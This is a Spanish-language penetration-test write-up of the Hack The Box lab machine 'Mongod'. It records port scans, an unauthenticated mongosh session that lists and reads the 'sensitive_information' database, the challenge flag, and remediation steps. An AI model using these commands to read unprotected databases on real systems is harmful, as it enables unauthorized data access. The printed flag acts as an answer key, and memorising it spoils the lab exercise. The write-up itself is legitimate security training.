---
title: Mongod
os: Linux
dificultad: Very Easy
ip: 10.129.228.30
fecha: 2026-10-17
categoria: Starting Point
estado: completada
tags: [htb, linux, mongodb, unauthenticated-access, misconfiguration]
---

# Mongod — Informe de Pentest

> Writeup de la máquina **Mongod** de [Hack The Box](https://www.hackthebox.com/). Documento con fines educativos, realizado en un entorno de laboratorio autorizado.

## Información general

| Campo                   | Detalle         |
| ----------------------- | --------------- |
| **Máquina**             | Mongod          |
| **Sistema operativo**   | Linux           |
| **Dificultad**          | Very Easy       |
| **Categoría**           | Starting Point  |
| **Dirección IP**        | `10.129.228.30` |
| **Fecha de resolución** | 2026-10-17      |
| **Autor del informe**   | NiettoFrann     |
| **Estado**              | Completada      |

## Índice

1. [Resumen ejecutivo](#resumen-ejecutivo)
2. [Hallazgos de un vistazo](#hallazgos-de-un-vistazo)
3. [Alcance y metodología](#alcance-y-metodología)
4. [Cadena de ataque](#cadena-de-ataque)
5. [Reconocimiento](#reconocimiento)
6. [Enumeración](#enumeración)
7. [Explotación (Foothold)](#explotación-foothold)
8. [Escalada de privilegios](#escalada-de-privilegios)
9. [Flags](#flags)
10. [Detalle de hallazgos](#detalle-de-hallazgos)
11. [Plan de remediación priorizado](#plan-de-remediación-priorizado)
12. [Lecciones aprendidas](#lecciones-aprendidas)
13. [Herramientas utilizadas](#herramientas-utilizadas)
14. [Evidencia](#evidencia)
15. [Referencias](#referencias)

---

## Resumen ejecutivo

Se evaluó, desde fuera y sin credenciales, un servidor Linux de laboratorio que aloja una base de datos de información sensible.

**Resultado:** la base de datos está abierta a la red sin ningún control de acceso. Cualquier persona que alcance el servidor puede listar, leer y, según la propia advertencia del sistema, modificar o borrar todo su contenido. Se accedió a una base denominada `sensitive_information` en pocos minutos y con una sola conexión, sin conocimientos avanzados.

**Por qué importa:** los datos quedan expuestos en confidencialidad, integridad y disponibilidad. En un entorno real esto implicaría fuga de datos, posible manipulación de registros y obligaciones de notificación según la normativa aplicable de protección de datos.

**Qué hacer:**
1. Activar la autenticación en la base de datos (acción de esfuerzo bajo, plazo: 24-48 h).
2. Impedir que la base de datos sea accesible desde fuera del servidor o de la red de aplicación (24-48 h).
3. Revisar los registros de conexión para descartar accesos previos no autorizados y planificar la actualización de la versión, que ya no recibe soporte (30 días).

**Riesgo global: Crítico.** Puntuado asumiendo exposición real, no solo de laboratorio.

| Severidad | Hallazgos |
| --------- | --------- |
| Crítica   | 1         |
| Informativa | 1       |

## Hallazgos de un vistazo

| ID   | Hallazgo                                                   | Severidad   | CVSS | Estado                  |
| ---- | ---------------------------------------------------------- | ----------- | ---- | ----------------------- |
| H-01 | MongoDB expuesto en red sin autenticación                  | Crítica     | 9.8  | Explotado y confirmado  |
| H-02 | Versión de MongoDB (3.6.8) sin soporte del fabricante      | Informativa | 0.0  | Observado               |

## Alcance y metodología

- **Objetivo:** `10.129.228.30` (Mongod)
- **Tipo de prueba:** caja negra, sin credenciales previas.
- **Reglas de enjuiciamiento:** entorno de laboratorio autorizado. No se realizaron ataques de denegación de servicio ni se modificó o eliminó ningún dato.
- **Metodología:** Reconocimiento → Enumeración → Explotación → Post-explotación / Escalada de privilegios → Documentación.
- **Entorno:** conexión a la VPN de HTB desde Linux.

## Cadena de ataque

```text
Ping (TTL 63 → Linux)
  -> Escaneo de 65535 puertos (22/tcp, 27017/tcp)
  -> Escaneo detallado: MongoDB 3.6.8 y listado de bases visible sin credenciales      [H-01] [H-02]
  -> Conexión con mongosh sin autenticación                                           [H-01]
  -> show dbs -> use sensitive_information -> show collections -> db.flag.find()      [H-01]
  -> Flag
```

El único fallo explotado es H-01. H-02 es un factor agravante: una versión sin soporte no recibe correcciones de seguridad.

---

## Reconocimiento

### Conectividad y sistema operativo

**Objetivo:** confirmar que el host está activo y estimar su sistema operativo.

```bash
ping -c 1 10.129.228.30 | tee loot/ping.txt
```

```text
64 bytes from 10.129.228.30: icmp_seq=1 ttl=63 time=236 ms
1 packets transmitted, 1 received, 0% packet loss
```

> Evidencia: [`loot/ping.txt`](loot/ping.txt)

**Interpretación:** host activo a ~236 ms. Los sistemas Linux parten de TTL 64; el 63 indica un salto intermedio (la VPN). Sistema **Linux**.

### Escaneo de puertos

**Objetivo:** descubrir la superficie de ataque completa. Se escanean los 65535 puertos TCP de forma rápida y luego se profundiza solo en los abiertos.

```bash
nmap -p- --min-rate=5000 -T4 -Pn -n 10.129.228.30 -oN loot/puertos.txt
```

```text
Not shown: 65533 closed tcp ports (conn-refused)
PORT      STATE SERVICE
22/tcp    open  ssh
27017/tcp open  mongod
```

> Evidencia: [`loot/puertos.txt`](loot/puertos.txt)

| Opción            | Motivo                                                   |
| ----------------- | -------------------------------------------------------- |
| `-p-`             | Todos los puertos (1-65535).                             |
| `--min-rate=5000` | Envía al menos 5000 paquetes/s para acelerar el escaneo. |
| `-T4`             | Plantilla de tiempos agresiva.                           |
| `-Pn`             | Omite el descubrimiento de host (se asume activo).       |
| `-n`              | Sin resolución DNS.                                      |
| `-oN`             | Guarda la salida en formato normal.                      |

**Decisión:** dos servicios. SSH (22) requiere credenciales y no se ataca por fuerza bruta en una máquina de este nivel. El puerto 27017 es el puerto estándar de MongoDB y es el candidato principal.

### Detección de versiones y scripts

```bash
nmap -p22,27017 -sCV -Pn -n -T4 10.129.228.30 -oN loot/detallado.txt
```

```text
22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
27017/tcp open  mongodb MongoDB 3.6.8 3.6.8
| mongodb-databases:
|   ...  name = config / local / sensitive_information / users / admin
```

> Evidencia: [`loot/detallado.txt`](loot/detallado.txt)

| Puerto    | Estado | Servicio | Versión                              |
| --------- | ------ | -------- | ------------------------------------ |
| 22/tcp    | open   | ssh      | `OpenSSH 8.2p1 Ubuntu 4ubuntu0.5`    |
| 27017/tcp | open   | mongodb  | `MongoDB 3.6.8`                      |

**Interpretación:** los scripts NSE de nmap pudieron **listar las bases de datos sin credenciales**. Esto ya demuestra que no hay control de acceso en MongoDB antes de conectar con ningún cliente. Aparece una base llamada `sensitive_information`.

## Enumeración

### MongoDB (27017/tcp)

**Objetivo:** confirmar el acceso anónimo con un cliente real y localizar datos de interés.

```bash
mongosh --host 10.129.228.30 --port 27017
```

La conexión se establece sin solicitar usuario ni contraseña y el servidor advierte en el arranque:

```text
** WARNING: Access control is not enabled for the database.
**          Read and write access to data and configuration is unrestricted.
```

```text
test> show dbs
admin                   32.00 KiB
config                 108.00 KiB
local                   72.00 KiB
sensitive_information   32.00 KiB
users                   32.00 KiB
```

> Evidencia: [`loot/mongo.txt`](loot/mongo.txt)

**Decisión:** la base `sensitive_information` es el objetivo evidente por su nombre. La base `users` queda registrada como dato de interés, pero no se consultó porque no era necesaria para el objetivo de la máquina.

## Explotación (Foothold)

- **Vulnerabilidad:** MongoDB sin control de acceso (`security.authorization` desactivado) y accesible desde la red.
- **Referencia:** [CWE-306 – Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html). No hay CVE: es un error de configuración.
- **Impacto:** acceso a todas las bases de datos del servidor.

### Procedimiento

```bash
mongosh --host 10.129.228.30 --port 27017
```

```javascript
show dbs
use sensitive_information
show collections
db.flag.find()
```

```text
sensitive_information> show collections
flag
sensitive_information> db.flag.find()
[ { _id: ObjectId("630e3dbcb82540ebbd1748c5"), flag: '1b6e6fb359e7c40241b6d431427ba6ea' } ]
```

> Evidencia: [`loot/mongo.txt`](loot/mongo.txt)

**Resultado:** lectura confirmada de la colección `flag`. No se realizaron operaciones de escritura o borrado.

> **No se obtuvo shell en el sistema.** El acceso se limita al servicio de base de datos, lo cual cumple el objetivo de la máquina.

## Escalada de privilegios

No se realizó. El objetivo de la máquina (leer la flag de la base de datos) se alcanzó con el acceso inicial. Ese acceso ya otorga el máximo privilegio **dentro de MongoDB**, por lo que no hay barrera que escalar en ese servicio.

**Qué habría pasado con más alcance:** una instancia sin autenticación puede, además de leer datos, crear usuarios administradores o alterar registros. En configuraciones más permisivas, esto es un paso previo habitual hacia la ejecución de código en el host. Este informe no lo prueba, por lo que es una **posibilidad no confirmada**.

---

## Flags

| Flag   | Valor                              |
| ------ | ---------------------------------- |
| `flag` | `1b6e6fb359e7c40241b6d431427ba6ea` |

> Mongod pertenece a Starting Point: solo existe una flag, obtenida de la base de datos (no hay `user.txt` / `root.txt`). Se muestra completa por coherencia con los demás informes de Starting Point del repositorio. Evidencia: [`loot/mongo.txt`](loot/mongo.txt).

## Detalle de hallazgos

### H-01 — MongoDB expuesto en red sin autenticación

| Campo           | Detalle                                                                                             |
| --------------- | --------------------------------------------------------------------------------------------------- |
| **Severidad**   | Crítica                                                                                             |
| **CVSS v3.1**   | 9.8 — `CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H`                                               |
| **CWE**         | [CWE-306 – Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html) |
| **CVE**         | N/A (error de configuración, no un defecto del software)                                            |
| **Componente**  | MongoDB 3.6.8 — 27017/tcp                                                                           |
| **Estado**      | Explotado y confirmado (lectura)                                                                    |

**Descripción.** El servicio de base de datos acepta conexiones desde la red sin pedir usuario ni contraseña.

**Impacto.** Cualquier persona con conectividad de red puede listar y leer todas las bases de datos. *Confirmado:* lectura de `sensitive_information`. *Probable, no ejercido:* modificación y borrado, según indica el propio servidor ("Read and write access … is unrestricted"). La puntuación I:H y A:H se basa en esa advertencia. Puntuado asumiendo exposición real.

**Evidencia.** Conexión con `mongosh` sin credenciales y lectura de la colección `flag`: [`loot/mongo.txt`](loot/mongo.txt). El listado de bases sin autenticación también aparece en [`loot/detallado.txt`](loot/detallado.txt).

**Remediación.**
- *Corrección:* crear un usuario administrador y activar la autorización en `/etc/mongod.conf`:
  ```yaml
  security:
    authorization: enabled
  ```
- *Mitigación:* limitar el acceso con `net.bindIp` (`127.0.0.1` o la IP de la aplicación) y reglas de firewall sobre el puerto 27017.
- *Detección:* revisar `/var/log/mongodb/mongod.log` en busca de conexiones desde IPs desconocidas y validar la integridad de los datos.

**Referencias.** [MongoDB Security Checklist](https://www.mongodb.com/docs/v3.6/administration/security-checklist/) · [HackTricks – 27017 MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)

### H-02 — Versión de MongoDB (3.6.8) sin soporte del fabricante

| Campo           | Detalle                                                                    |
| --------------- | -------------------------------------------------------------------------- |
| **Severidad**   | Informativa                                                                |
| **CVSS v3.1**   | 0.0 — no se identificó ninguna vulnerabilidad concreta explotable          |
| **CWE**         | [CWE-1104 – Use of Unmaintained Third Party Components](https://cwe.mitre.org/data/definitions/1104.html) |
| **Componente**  | MongoDB 3.6.8 — 27017/tcp                                                  |
| **Estado**      | Observado, no explotado                                                    |

**Descripción.** La rama 3.6 de MongoDB ha llegado al final de su ciclo de vida y no recibe correcciones de seguridad.

**Impacto.** No se confirmó ninguna vulnerabilidad específica de esta versión en la prueba. El riesgo es futuro: los fallos que se descubran no tendrán parche oficial. Se deja como Informativa por ausencia de un vector demostrado y se recomienda verificar las fechas de soporte en el sitio del fabricante antes de citarlas en un informe formal.

**Evidencia.** `MongoDB 3.6.8` en [`loot/detallado.txt`](loot/detallado.txt) y en [`loot/mongo.txt`](loot/mongo.txt).

**Remediación.**
- *Corrección:* migrar a una versión con soporte vigente, probando antes la compatibilidad de la aplicación.
- *Mitigación:* mantener el servicio aislado en red (ver H-01) hasta migrar.

## Plan de remediación priorizado

| Prioridad | Acción                                                                                  | Hallazgos | Esfuerzo | Reducción de riesgo | Plazo sugerido     |
| --------- | --------------------------------------------------------------------------------------- | --------- | -------- | ------------------- | ------------------ |
| P1        | Crear administrador y activar `security.authorization: enabled`                         | H-01      | Bajo     | Crítico → Bajo      | 24-48 h            |
| P1        | Restringir 27017 con `bindIp` y firewall a los hosts que lo necesitan                   | H-01      | Bajo     | Crítico → Bajo      | 24-48 h            |
| P2        | Revisar logs de conexión y comprobar integridad de datos                                | H-01      | Medio    | Detección           | ≤ 7 días           |
| P3        | Migrar a una versión de MongoDB con soporte                                             | H-02      | Medio    | Informativa → N/A   | Siguiente ciclo    |

P1 es aplicable de inmediato y por sí solo elimina el vector explotado.

## Lecciones aprendidas

- Tras el escaneo completo, conviene reconocer los servicios por su puerto estándar (`27017` → MongoDB) y comprobar el acceso anónimo antes de buscar exploits.
- Los scripts NSE (`-sC`) pueden revelar datos, como el listado de bases, sin usar un cliente específico. Esto es evidencia temprana de ausencia de autenticación.
- Un servicio sin autenticación es un fallo de configuración, no de software. La versión instalada no importa si el acceso está abierto.
- Documentar la decisión tras cada paso (qué implica el resultado) hace que el writeup sea reproducible y comunicable.

## Herramientas utilizadas

| Herramienta | Uso                                              |
| ----------- | ------------------------------------------------ |
| ping        | Test de conectividad y estimación del SO por TTL |
| nmap        | Escaneo de puertos, versiones y scripts NSE      |
| mongosh     | Cliente de MongoDB para enumerar y leer datos    |

## Evidencia

Todos los artefactos están en la carpeta [`loot/`](loot/):

| Fichero                               | Contenido                                                            |
| ------------------------------------- | -------------------------------------------------------------------- |
| [`ping.txt`](loot/ping.txt)           | Test de conectividad (TTL 63).                                       |
| [`puertos.txt`](loot/puertos.txt)     | Escaneo completo de puertos (22/tcp y 27017/tcp abiertos).           |
| [`detallado.txt`](loot/detallado.txt) | Versiones, listado de bases de datos vía NSE (MongoDB 3.6.8).        |
| [`mongo.txt`](loot/mongo.txt)         | Sesión de `mongosh`: advertencia de acceso, `show dbs` y lectura de la flag. |

## Referencias

- [Página de la máquina en HTB](https://app.hackthebox.com/machines/Mongod)
- [CWE-306 – Missing Authentication for Critical Function](https://cwe.mitre.org/data/definitions/306.html)
- [CWE-1104 – Use of Unmaintained Third Party Components](https://cwe.mitre.org/data/definitions/1104.html)
- [MongoDB Security Checklist](https://www.mongodb.com/docs/v3.6/administration/security-checklist/)
- [HackTricks – MongoDB](https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb)
